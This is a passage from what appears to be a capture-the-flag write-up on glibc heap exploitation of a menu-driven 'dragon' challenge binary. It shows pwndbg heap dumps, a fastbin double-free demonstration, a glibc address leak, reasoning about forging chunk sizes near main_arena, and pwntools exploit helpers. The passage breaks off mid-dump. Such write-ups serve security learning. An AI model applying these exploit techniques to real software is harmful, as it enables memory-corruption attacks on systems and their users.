+<span class="code-blue">0x00007ffff7b0301e</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x555555559420, <span class="code-dark-cyan">nbytes</span>=1024) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><p>This is the heap at this moment:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+...
+0x555555559820  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000021</span>      <span class="code-dark-green">........!.......</span>
+0x555555559830  <span class="code-dark-green">0x0000000a41414141</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">AAAA............</span>
+0x555555559840  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000021</span>      <span class="code-dark-blue">........!.......</span>
+0x555555559850  <span class="code-dark-blue">0x0000000a42424242</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">BBBB............</span>
+0x555555559860  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x00000000000207a1</span>      <span class="code-dark-yellow">................</span>         &lt;-- Top chunk  
+</code></pre></div><p>Now, let&rsquo;s free <code>A</code>, <code>B</code> and <code>A</code> again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+2
+
+Dragon of choice: 0
+
+<span class="code-green">[+] The dragon flies away!</span>
+
+<span class="code-blue">Dragons: [2/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 2</span>
+
+<span class="code-white">Dragon of choice: 1</span>
+
+<span class="code-green">[+] The dragon flies away!</span>
+
+<span class="code-blue">Dragons: [2/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 2</span>
+
+<span class="code-white">Dragon of choice: 0</span>
+
+<span class="code-green">[+] The dragon flies away!</span>
+
+<span class="code-blue">Dragons: [2/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; ^C</span>
+<span class="code-white">Program received signal SIGINT, Interrupt.</span>
+<span class="code-blue">0x00007ffff7b0301e</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x555555559420, <span class="code-dark-cyan">nbytes</span>=1024) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><p>And we have this on the heap:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+...
+0x555555559820  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000021</span>      <span class="code-dark-green">........!.......</span>         &lt;-- fastbins[0x20][0], fastbins[0x20][0]  
+0x555555559830  <span class="code-dark-green">0x0000555555559840</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">@.UUUU..........</span>
+0x555555559840  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000021</span>      <span class="code-dark-blue">........!.......</span>         &lt;-- fastbins[0x20][1]
+0x555555559850  <span class="code-dark-blue">0x0000555555559820</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue"> .UUUU..........</span>
+0x555555559860  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x00000000000207a1</span>      <span class="code-dark-yellow">................</span>         &lt;-- Top chunk
+<span class="code-red">pwndbg&gt; </span>fastbins
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: <span class="code-dark-blue">0x555555559820</span> —▸ <span class="code-dark-blue">0x555555559840</span> ◂— 0x555555559820
+</code></pre></div><p>As can be seen, chunk <code>A</code> (address <code>0x555555559820</code>) is twice in the list. Now, let&rsquo;s allocate another chunk, modify the <code>fd</code> pointer for <code>A</code> and allocate <code>B</code> and <code>A</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+1
+
+Dragon's length: 24
+
+Name your dragon: ABCDEFG
+
+<span class="code-blue">Dragons: [3/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Dragon's length: 24</span>
+
+<span class="code-white">Name your dragon: BBBB</span>
+
+<span class="code-blue">Dragons: [4/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Dragon's length: 24</span>
+
+<span class="code-white">Name your dragon: AAAA</span>
+
+<span class="code-blue">Dragons: [5/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; ^C</span>
+<span class="code-white">Program received signal SIGINT, Interrupt.</span>
+<span class="code-blue">0x00007ffff7b0301e</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x555555559420, <span class="code-dark-cyan">nbytes</span>=1024) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+...
+0x555555559820  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000021</span>      <span class="code-dark-green">........!.......</span>
+0x555555559830  <span class="code-dark-green">0x0a47000a41414141</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">AAAA..G.........</span>
+0x555555559840  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000021</span>      <span class="code-dark-blue">........!.......</span>
+0x555555559850  <span class="code-dark-blue">0x0000000a42424242</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">BBBB............</span>
+0x555555559860  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x00000000000207a1</span>      <span class="code-dark-yellow">................</span>         &lt;-- Top chunk  
+<span class="code-red">pwndbg&gt; </span>fastbins
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0xa47464544434241 ('ABCDEFG\n')
+</code></pre></div><p>Obviously, if we try to allocate a new chunk of size <code>0x20</code>, the program will crash because the next address is <code>0xa47464544434241</code>, which is not valid:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+1
+
+Dragon's length: 24
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="code-dark-blue">0x00007ffff7a9dbeb</span> in <span class="code-dark-yellow">_int_malloc</span> (<span class="code-dark-cyan">av=av@entry</span>=0x7ffff7dd0b60 &lt;main_arena&gt;, <span class="code-dark-cyan">bytes=bytes@entry</span>=24) at <span class="code-dark-green">malloc.c</span>:3586  
+3586    malloc.c: No such file or directory.
+</code></pre></div><p>This technique is known as Fast Bin dup. These are some good resources to learn about the technique:</p><ul><li><a href="https://www.youtube.com/watch?v=6-Et7M7qJJg">Introduction To GLIBC Heap Exploitation - Max Kamper</a></li><li><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#fastbin-dup">0x434b.dev</a></li><li><a href="https://github.com/shellphish/how2heap/">how2heap</a></li></ul><p>With this technique, the usual approach is to target <code>__malloc_hook</code> because in the surroundings of <code>__malloc_hook</code> there are some Glibc addresses. These addresses are very useful because start with <code>0x7f</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/24gx &__malloc_hook - 4
+<span class="code-dark-blue">0x7ffff7dd0b30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007ffff7dccee0      0x0000000000000000  
+<span class="code-dark-blue">0x7ffff7dd0b40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x00007ffff7a9fa10      0x00007ffff7a9fed0
+<span class="code-dark-blue">0x7ffff7dd0b50</span> &lt;<span class="code-dark-yellow">__malloc_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0b60</span> &lt;<span class="code-dark-yellow">main_arena</span>&gt;:    0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7ffff7dd0b70</span> &lt;<span class="code-dark-yellow">main_arena</span>+16&gt;: 0x0a47464544434241      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0b80</span> &lt;<span class="code-dark-yellow">main_arena</span>+32&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0b90</span> &lt;<span class="code-dark-yellow">main_arena</span>+48&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0ba0</span> &lt;<span class="code-dark-yellow">main_arena</span>+64&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0bb0</span> &lt;<span class="code-dark-yellow">main_arena</span>+80&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0bc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x0000555555559860      0x0000000000000000
+<span class="code-dark-blue">0x7ffff7dd0bd0</span> &lt;<span class="code-dark-yellow">main_arena</span>+112&gt;:        0x00007ffff7dd0bc0      0x00007ffff7dd0bc0
+<span class="code-dark-blue">0x7ffff7dd0be0</span> &lt;<span class="code-dark-yellow">main_arena</span>+128&gt;:        0x00007ffff7dd0bd0      0x00007ffff7dd0bd0
+</code></pre></div><p>This byte can be used as a fake size of a <code>0x70</code>-sized chunk. Another security check that applies for Fast Bin chunks is that the size field must be valid.</p><p>The problem here is that <code>0x70</code>-sized chunks are not allowed (only sizes from <code>0</code> to <code>0x58</code> and from <code>0x69</code> to <code>0x78</code>). So we won&rsquo;t be able to use the common Fast Bin dup technique.</p><p>This challenge made me think out-of-the-box and find another approach to use Fast Bin dup (which is the only attack we have at this moment). Even I needed to analyze <code>malloc</code> and its security checks in <a href="https://elixir.bootlin.com/glibc/glibc-2.30/source/malloc/malloc.c">Glibc source code</a>.</p><p>I tried to see if having a stack leak was better than Glibc leak. A <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit">House of Spirit</a> attack could have been possible to modify the return address on the stack, but the program uses <code>exit</code>, it does not return. I checked all the documented attacks on <a href="https://github.com/shellphish/how2heap/">how2heap</a> and nothing was suitable.</p><h3 id="understanding-the-arena">Understanding the arena</h3><p>As can be seen in the previous output, below <code>__malloc_hook</code> we have <code>main_arena</code>, which is the structure that handles the heap. For more information, these resources are worth reading carefully:</p><ul><li><a href="https://sourceware.org/glibc/wiki/MallocInternals">MallocInternals</a></li><li><a href="https://jackfromeast.site/2023-01/understand-the-heap-a-beautiful-mess.html">Understanding the Heap - a beautiful mess</a></li><li><a href="https://pedro-bernardo.github.io/assets/pdf/PWN_Heap_Basics2.pdf">PWN - Glibc Heap Basics</a></li></ul><p>The <code>main_arena</code> structure holds pointers to the next freed chunks to be allocated (singly linked lists for Fast Bin chunks, and doubly linked lists for Unsorted Bin, Small Bin and Large Bin chunks). Another important field is the address of the top chunk, which is the chunk that is at the bottom of the heap, where the new allocated memory is taken from.</p><p>The thing is that the addresses of the heap and the binary start with <code>0x55</code> or <code>0x56</code> because of PIE and ASLR. If addresses start with <code>0x56</code>, we can use this byte as a fake size for a <code>0x50</code>-sized chunk.</p><p>A size of <code>0x55</code> is not valid because flags (<code>AMP</code>) are <code>101</code> in binary, so the chunk is supposed to belong to the application arena, was not allocated with <code>mmap</code> and the previous chunk is inuse. But a size of <code>0x56</code> (flags <code>110</code>) say that the chunks belongs to the application arena but it was allocated with <code>mmap</code>, so it is not part of an arena. This is a valid configuration and the heap allocator will not complain.</p><h2 id="exploit-development">Exploit development</h2><p>We will use this helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">length</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Dragon's length: "</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">length</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name your dragon: '</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">release</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Dragon of choice: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+</code></pre></div><p>Returning to the challenge, we already have a target for the Fast Bin dup technique, because we need to have a valid fake size to allocate a chunk outside of the heap. This is the code for this explanation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)  </span><span class="mtk3"># 0</span>  
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">)  </span><span class="mtk3"># 1</span>
+
+<span class="mtk1">    </span><span class="mtk8">summon</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">28</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1">)  </span><span class="mtk3"># 2</span>
+<span class="mtk1">    </span><span class="mtk8">release</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">release</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">release</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">release</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+</code></pre></div><p>Let&rsquo;s see the state of <code>main_arena</code> and the heap:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3485693
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './da', '3485693', '-x', '/tmp/pwnrpw70xpr.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7f365b0c6420
+[<span class="code-green">+</span>] Glibc base address: 0x7f365ad15000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-green">[+] The dragon flies away!</span>
+
+<span class="code-blue">Dragons: [3/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+...
+</span>0x557f61bd6420  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000051</span>      <span class="code-dark-green">........Q.......</span>         &lt;-- fastbins[0x50][0], fastbins[0x50][0]
+0x557f61bd6430  <span class="code-dark-green">0x0000557f61bd6470</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">pd.a.U..........</span>
+0x557f61bd6440  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x557f61bd6450  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x557f61bd6460  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x557f61bd6470  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000051</span>      <span class="code-dark-blue">........Q.......</span>         &lt;-- fastbins[0x50][1]
+0x557f61bd6480  <span class="code-dark-blue">0x0000557f61bd6420</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue"> d.a.U..........</span>
+0x557f61bd6490  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x557f61bd64a0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x557f61bd64b0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x557f61bd64c0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000031</span>      <span class="code-dark-yellow">........1.......</span>         &lt;-- fastbins[0x30][0]
+0x557f61bd64d0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">................</span>
+0x557f61bd64e0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">................</span>
+0x557f61bd64f0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x000000000001fb11</span>      <span class="code-dark-cyan">................</span>         &lt;-- Top chunk
+<span class="code-red">pwndbg&gt; </span>p/x main_arena
+$6 = {
+  mutex = 0x0,
+  flags = 0x0,
+  have_fastchunks = 0x1,
+  fastbinsY = {0x0, 0x557f61bd64c0, 0x0, 0x557f61bd6420, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
+  top = 0x557f61bd64f0,
+  last_remainder = 0x0,
+  bins = {0x7f365b0c9bc0, 0x7f365b0c9bc0, 0x7f365b0c9bd0, 0x7f365b0c9bd0, 0x7f365b0c9be0, 0x7f365b0c9be0, 0x7f365b0c9bf0, 0x7f365b0c9bf0, 0x7f365b0c9c00, 0x7f365b0c9c00, 0x7f365b0c9c10, 0x7f365b0c9c10, 0x7f365b0c9c20, 0x7f365b0c9c20, 0x7f365b0c9c30, 0x7f365b0c9c30, 0x7f365b0c9c40, 0x7f365b0c9c40, 0x7f365b0c9c50, 0x7f365b0c9c50, 0x7f365b0c9c60, 0x7f365b0c9c60, 0x7f365b0c9c70, 0x7f365b0c9c70, 0x7f365b0c9c80, 0x7f365b0c9c80, 0x7f365b0c9c90, 0x7f365b0c9c90, 0x7f365b0c9ca0, 0x7f365b0c9ca0, 0x7f365b0c9cb0, 0x7f365b0c9cb0, 0x7f365b0c9cc0, 0x7f365b0c9cc0, 0x7f365b0c9cd0, 0x7f365b0c9cd0, 0x7f365b0c9ce0, 0x7f365b0c9ce0, 0x7f365b0c9cf0, 0x7f365b0c9cf0, 0x7f365b0c9d00, 0x7f365b0c9d00, 0x7f365b0c9d10, 0x7f365b0c9d10, 0x7f365b0c9d20, 0x7f365b0c9d20, 0x7f365b0c9d30, 0x7f365b0c9d30, 0x7f365b0c9d40, 0x7f365b0c9d40, 0x7f365b0c9d50, 0x7f365b0c9d50, 0x7f365b0c9d60, 0x7f365b0c9d60, 0x7f365b0c9d70, 0x7f365b0c9d70, 0x7f365b0c9d80, 0x7f365b0c9d80, 0x7f365b0c9d90, 0x7f365b0c9d90, 0x7f365b0c9da0, 0x7f365b0c9da0, 0x7f365b0c9db0, 0x7f365b0c9db0, 0x7f365b0c9dc0, 0x7f365b0c9dc0, 0x7f365b0c9dd0, 0x7f365b0c9dd0, 0x7f365b0c9de0, 0x7f365b0c9de0, 0x7f365b0c9df0, 0x7f365b0c9df0, 0x7f365b0c9e00, 0x7f365b0c9e00, 0x7f365b0c9e10, 0x7f365b0c9e10, 0x7f365b0c9e20, 0x7f365b0c9e20, 0x7f365b0c9e30, 0x7f365b0c9e30, 0x7f365b0c9e40, 0x7f365b0c9e40, 0x7f365b0c9e50, 0x7f365b0c9e50, 0x7f365b0c9e60, 0x7f365b0c9e60, 0x7f365b0c9e70, 0x7f365b0c9e70, 0x7f365b0c9e80, 0x7f365b0c9e80, 0x7f365b0c9e90, 0x7f365b0c9e90, 0x7f365b0c9ea0, 0x7f365b0c9ea0, 0x7f365b0c9eb0, 0x7f365b0c9eb0, 0x7f365b0c9ec0, 0x7f365b0c9ec0, 0x7f365b0c9ed0, 0x7f365b0c9ed0, 0x7f365b0c9ee0, 0x7f365b0c9ee0, 0x7f365b0c9ef0, 0x7f365b0c9ef0, 0x7f365b0c9f00, 0x7f365b0c9f00, 0x7f365b0c9f10, 0x7f365b0c9f10, 0x7f365b0c9f20, 0x7f365b0c9f20, 0x7f365b0c9f30, 0x7f365b0c9f30, 0x7f365b0c9f40, 0x7f365b0c9f40, 0x7f365b0c9f50, 0x7f365b0c9f50, 0x7f365b0c9f60, 0x7f365b0c9f60, 0x7f365b0c9f70, 0x7f365b0c9f70, 0x7f365b0c9f80, 0x7f365b0c9f80, 0x7f365b0c9f90, 0x7f365b0c9f90, 0x7f365b0c9fa0, 0x7f365b0c9fa0, 0x7f365b0c9fb0, 0x7f365b0c9fb0, 0x7f365b0c9fc0, 0x7f365b0c9fc0, 0x7f365b0c9fd0, 0x7f365b0c9fd0, 0x7f365b0c9fe0, 0x7f365b0c9fe0, 0x7f365b0c9ff0, 0x7f365b0c9ff0, 0x7f365b0ca000, 0x7f365b0ca000, 0x7f365b0ca010, 0x7f365b0ca010, 0x7f365b0ca020, 0x7f365b0ca020, 0x7f365b0ca030, 0x7f365b0ca030, 0x7f365b0ca040, 0x7f365b0ca040, 0x7f365b0ca050, 0x7f365b0ca050, 0x7f365b0ca060, 0x7f365b0ca060, 0x7f365b0ca070, 0x7f365b0ca070, 0x7f365b0ca080, 0x7f365b0ca080, 0x7f365b0ca090, 0x7f365b0ca090, 0x7f365b0ca0a0, 0x7f365b0ca0a0, 0x7f365b0ca0b0, 0x7f365b0ca0b0, 0x7f365b0ca0c0, 0x7f365b0ca0c0, 0x7f365b0ca0d0, 0x7f365b0ca0d0, 0x7f365b0ca0e0, 0x7f365b0ca0e0, 0x7f365b0ca0f0, 0x7f365b0ca0f0, 0x7f365b0ca100, 0x7f365b0ca100, 0x7f365b0ca110, 0x7f365b0ca110, 0x7f365b0ca120, 0x7f365b0ca120, 0x7f365b0ca130, 0x7f365b0ca130, 0x7f365b0ca140, 0x7f365b0ca140, 0x7f365b0ca150, 0x7f365b0ca150, 0x7f365b0ca160, 0x7f365b0ca160, 0x7f365b0ca170, 0x7f365b0ca170, 0x7f365b0ca180, 0x7f365b0ca180, 0x7f365b0ca190, 0x7f365b0ca190, 0x7f365b0ca1a0, 0x7f365b0ca1a0, 0x7f365b0ca1b0, 0x7f365b0ca1b0, 0x7f365b0ca1c0, 0x7f365b0ca1c0, 0x7f365b0ca1d0, 0x7f365b0ca1d0, 0x7f365b0ca1e0, 0x7f365b0ca1e0, 